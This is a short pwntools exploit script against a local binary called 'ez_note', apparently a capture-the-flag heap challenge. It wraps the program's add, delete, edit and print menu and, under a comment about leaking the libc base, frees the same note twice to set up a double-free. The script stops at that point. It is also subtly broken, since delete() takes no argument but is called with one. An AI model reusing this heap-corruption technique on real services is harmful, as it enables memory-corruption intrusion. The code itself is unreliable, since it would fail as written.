from pwn import *
pname='ez_note'
p=process(pname)

def add(id,s):
    p.sendline(b'1')
    p.recvuntil(b'id: ')
    p.sendline(str(id).encode())
    p.recvuntil('len: ')
    p.sendline(str(len(s)).encode())
    p.recvuntil('content: ')
    p.send(s)
def delete():
    p.sendline(b'2')
    p.recvuntil(b'id: ')
    p.sendline(str(id).encode())
def edit(id,s):
    p.sendline(b'3')
    p.recvuntil(b'id: ')
    p.sendline(str(id).encode())
    p.recvuntil('content: ')
    p.send(s)
def p_note(id,l):
    p.sendline(b'4')
    p.recvuntil(b'id: ')
    p.sendline(str(id).encode())
    return p.recv(l)

# 泄露libc基址
add(1,b'a'*0x30)
add(2,b'a'*0x30)

delete(1)
delete(2)
delete(1)
